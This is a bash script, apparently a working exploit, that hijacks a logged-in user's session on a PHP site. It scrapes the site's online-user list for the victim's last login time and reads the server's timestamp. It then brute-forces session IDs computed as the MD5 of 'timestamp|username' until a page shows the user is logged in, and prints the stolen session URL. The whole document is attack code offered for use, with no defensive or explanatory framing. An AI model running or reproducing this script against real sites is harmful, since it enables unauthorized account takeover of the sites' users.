#!/bin/bash

if [[ "$1" != "" ]]; then
    url="$1"
else
    echo -n "URL to site (http://.../index.php): "
    read url
fi

echo -n "Username to hijack: "
read user

page=$(curl "$url" 2>/dev/null)
lastLogin=$(echo "$page" | grep -i "$user" | cut -d' ' -f2 | sed -e 's/(//g')

if [[ "$lastLogin" == "" ]]; then
    echo "Can't hijack, user $user is currently not online"
    exit 1
else
    echo "Found $user, last login: $lastLogin minutes ago"
fi

currTime=$(echo "$page" | grep "unixzeit" | cut -d'=' -f2)

if [[ "$lastLogin" == "0" ]]; then
    lastLogin=1
fi
lastLogin=$((($lastLogin*60)+50))

echo "Trying to hijack $user's session..."

for i in {0..200}; do
    time=$((${currTime}-${lastLogin}+$i))
    sessData="$time|$user"
    sessID=$(echo -n "$sessData" | md5sum | cut -d' ' -f1)
    page=$(curl "${url}?s=$sessID" 2>/dev/null)
    if [[ "$(echo $page | grep 'you are')" != "" ]]; then
        echo ""
        echo "Got the session ID: $sessID"
        echo "URL: ${url}?s=$sessID"
        echo ""
        echo "Have a nice day! Bye"
        exit 0
    fi
done

echo "Could not hijack $user. This happens sometimes, probably because of time differences"
echo "Sometimes, it worth trying again :)"
exit 2
